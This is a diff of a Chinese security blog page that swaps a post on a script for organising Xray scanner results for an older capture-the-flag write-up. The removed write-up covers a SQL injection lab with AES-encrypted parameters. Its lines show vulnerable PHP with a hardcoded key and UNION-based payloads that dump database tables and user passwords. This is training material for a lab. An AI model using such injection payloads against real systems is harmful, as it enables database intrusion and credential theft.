@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>墨者学院CTF（SQL注入漏洞测试(参数加密)） | RainMaker</title>
+    <title>Xray扫描结果整理小脚本分享 | RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckys5td44003d6c4z0wmkfibj" class="article article-type-post" itemscope
+    <article id="post-ckys5td3t002a6c4z5ptz8l1n" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -147,7 +147,7 @@
             
   
     <h1 class="article-title" itemprop="name">
-      墨者学院CTF（SQL注入漏洞测试(参数加密)）
+      Xray扫描结果整理小脚本分享
     </h1>
   
 
@@ -157,18 +157,18 @@
         <div class="article-more-info article-more-info-post hairline">
 
             <div class="article-date">
-  <time datetime="2019-08-10T05:18:48.000Z" itemprop="datePublished">2019-08-10</time>
+  <time datetime="2022-01-24T03:42:38.000Z" itemprop="datePublished">2022-01-24</time>
 </div>
 
             
             <div class="article-category">
-                <a class="article-category-link" href="/categories/CTF/">CTF</a>
+                <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>,<a class="article-category-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a>
             </div>
             
 
             
             <div class="article-tag">
-                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li></ul>
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li></ul>
             </div>
             
 
@@ -181,51 +181,26 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <p>靶场地址：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/SjRRVFpOQWlLWDBJd3hzNGY5cFBiQT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/SjRRVFpOQWlLWDBJd3hzNGY5cFBiQT09bW96aGUmozhe</a></p>
-<span id="more"></span>
+            <p>在常规渗透测试或<code>SRC</code>挖掘中，经常使用<code>Xray</code>来进行漏洞扫描，当目标数量过大时往往会造成产生许多扫描结果，不便于快速定位有效漏洞站点。以下是某次<code>XRAY</code>扫描结果：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220124114655671.png" alt="image-20220124114655671"></p>
+<p>可以看到扫描结果有很多，可以使用小脚本：<code>html_to_xlsx.py</code>进行提取。repo:<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/Xray_Scripts">https://github.com/SevenC-base/Xray_Scripts</a></p>
+<p>主要就是利用正则对html的扫描结果进行提取。</p>
+<pre><code class="hljs python">vuln1_info = re.findall (<span class="hljs-string">r&quot;&lt;script class=&#x27;web-vulns&#x27;&gt;webVulns.push\((.*?)\)&lt;/script&gt;&quot;</span>, str1, re.M | re.I)</code></pre>
+
+<pre><code class="hljs shell">  _    _ _             _   _               _
+ | |  | | |           | | | |             | |
+ | |__| | |_ _ __ ___ | | | |_ ___   __  _| |_____  __
+ |  __  | __| &#x27;_ ` _ \| | | __/ _ \  \ \/ / / __\ \/ /
+ | |  | | |_| | | | | | | | || (_) |  &gt;  &lt;| \__ \&gt;  &lt;
+ |_|  |_|\__|_| |_| |_|_|  \__\___/  /_/\_\_|___/_/\_
 
 
-<p> <strong>1. 靶场截图：</strong><img src="https://img-blog.csdnimg.cn/20190810122825737.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>2. 目录扫描</strong><br> <img src="https://img-blog.csdnimg.cn/2019081012305213.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">访问可得new目录下list.php源码，即在此处存在注入漏洞<br> <strong>3. 代码审计</strong></p>
-<pre><code class="hljs plaintext">&lt;?php
-header(&#x27;content-type:text/html;charset=utf-8&#x27;); //发起原始的http报头
-require_once &#x27;../config.php&#x27;;  //加载config.php的代码（个人理解为数据库查询代码）
-//解密过程
-function decode($data)&#123;
-	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&#x27;&#x27;,MCRYPT_MODE_CBC,&#x27;&#x27;); //打开加密算法和模块（算法名称、加密模块位置、加密模式CBC、加密模式的路径）
-                                                   					        //mcrypt_module_open打开成功返回家密描述符     $td = 加密描述符
-	mcrypt_generic_init($td,&#x27;ydhaqPQnexoaDuW3&#x27;,&#x27;2018201920202021&#x27;); //初始加密（加密描述符，加密密码，偏移量）
-	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));//解密数据    data密文
-	mcrypt_generic_deinit($td);//结束加密，执行清理工作
-	mcrypt_module_close($td);//关闭加密模块
-	if(substr(trim($data),-6)!==&#x27;_mozhe&#x27;)&#123;                                  //判断后6个字符是否等于_mozhe
-		echo &#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;;  //不等于重定向页面
-	&#125;else&#123;
-		return substr(trim($data),0,strlen(trim($data))-6);       //等于则回显数据
-	&#125;
-&#125;
-$id=decode($_GET[&#x27;id&#x27;]);          //$_GET[]传递参数id
-$sql=&quot;select id,title,content,time from notice where id=$id&quot;;
-$info=$link-&gt;query($sql);
-$arr=$info-&gt;fetch_assoc();
-?&gt;
-&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-&lt;meta charset=&quot;UTF-8&quot;&gt;
-&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;
-&lt;style&gt;.body&#123;width:600px;height:500px;margin:0 auto&#125;.title&#123;color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center&#125;.content,.title&#123;margin:0 auto;width:600px;display:block&#125;.content&#123;height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282&#125;&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;div class=&quot;body&quot;&gt;
-&lt;div class=&quot;title&quot;&gt;&lt;?php echo $arr[&#x27;title&#x27;]?&gt;&lt;/div&gt;
-&lt;div class=&quot;content&quot;&gt;&lt;?php echo $arr[&#x27;content&#x27;]?&gt;&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p><strong>即是先对通过?id=注入的数据解密得到明文进行判断是否后六个字符为_mozhe,只需反向加密构造payload即可</strong></p>
-<p> <strong>4. 构造payload</strong><br>        先对?id=之后的数据进行AES加密，加密模式CBC，加密位数128位，加密密码ydhaqPQnexoaDuW3，加密偏移量2018201920202021，然后又进行两次base64加密。<strong>填充为zeropadding。</strong><br><br>        <font color=#ff6600><strong>注意：</strong></font>AES加密后默认的输出结果是base64编码格式的，所以后续只需进行一次base64加密即可。<br>        <img src="https://img-blog.csdnimg.cn/20210511113422449.png" alt="在这里插入图片描述"></p>
-<p><br><strong>构造payload：-1 union select 1,2,3,4_mozhe</strong><br>        AES加密：xgd58ipTrnx8VzS*JicqCo3+zFFzhay5byFU3cjbdeI=<br>        base64加密：eGdkNThpcFRybng4VnpTQkppY3FDbzMrekZGemhheTVieUZVM2NqYmRlST0=<br>        获取显示位：<br>        <img src="https://img-blog.csdnimg.cn/20190810131021173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>5.爆库爆表爆列爆字段</strong><br>       爆库： -1 union select 1,database(),3,4_mozhe<br>       爆表：-1 union select 1,group_concat(table_name),3,4 frominformation_schema.TABLES where TABLE_SCHEMA=’mozhe_Discuz_StormGroup’ limit0,1_mozhe<br>       爆列：-1 union select 1,group_concat(column_name),3,4 frominformation_schema.columns where table_name=’StormGroup_member’ limit 0,1_mozhe<br>       爆字段：-1 union select 1,group_concat(name,password),3,4 fromStormGroup_member limit 0,1_mozhe<br>       <strong>6.得到key</strong><br>       注意MD5解密下，主要是信息泄露的代码搞懂就可以，加解密还是要了解下。</p>
-<p>分享几个加解密网站：<br>AES加密网站：<br><a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br>BASE64加密网站：<br><a target="_blank" rel="noopener" href="https://www.sojson.com/base64.html">https://www.sojson.com/base64.html</a><br>MD5加密网站：<br><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
-<p>​        </p>
+eg: python html_to_xlsx.py results
+    python html_to_xlsx.py D:\test\results</code></pre>
+
+<p>指定扫描结果保存的目录，提取结果如下：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/adalsndkanlasouahfalsnflanflfaksfnalf.png"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/2.png"></p>
 
         </div>
 
@@ -250,19 +225,10 @@ $arr=$info-&gt;fetch_assoc();
     
 <nav class="article-nav">
   
-    <a href="/1db69a83.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <div class="article-nav-caption">下一篇</div>
-      <div class="article-nav-title">
-        
-          墨者学院CTF(phpMyAdmin后台文件包含分析溯源)
-        
-      </div>
-    </a>
   
-  
-    <a href="/4b197965.html" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/401ba385.html" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-caption">上一篇</div>
-      <div class="article-nav-title">bugkuCTF(SQL注入2)</div>
+      <div class="article-nav-title">内网学习笔记4-权限提升分析及防御</div>
     </a>
   
 </nav>
@@ -271,15 +237,15 @@ $arr=$info-&gt;fetch_assoc();
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=墨者学院CTF（SQL注入漏洞测试(参数加密)） - RainMaker&url=http://hasaki-h2.github.io/911da9bb.html">
+            href="https://twitter.com/share?text=Xray扫描结果整理小脚本分享 - RainMaker&url=http://hasaki-h2.github.io/fd778797.html">
             <box-icon type='logo' name='twitter'></box-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=墨者学院CTF（SQL注入漏洞测试(参数加密)） - RainMaker&u=http://hasaki-h2.github.io/911da9bb.html">
+            href="https://www.facebook.com/sharer.php?title=Xray扫描结果整理小脚本分享 - RainMaker&u=http://hasaki-h2.github.io/fd778797.html">
             <box-icon name='facebook-square' type='logo' ></box-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=墨者学院CTF（SQL注入漏洞测试(参数加密)） - RainMaker&url=http://hasaki-h2.github.io/911da9bb.html&pic=">
+            href="https://service.weibo.com/share/share.php?title=Xray扫描结果整理小脚本分享 - RainMaker&url=http://hasaki-h2.github.io/fd778797.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
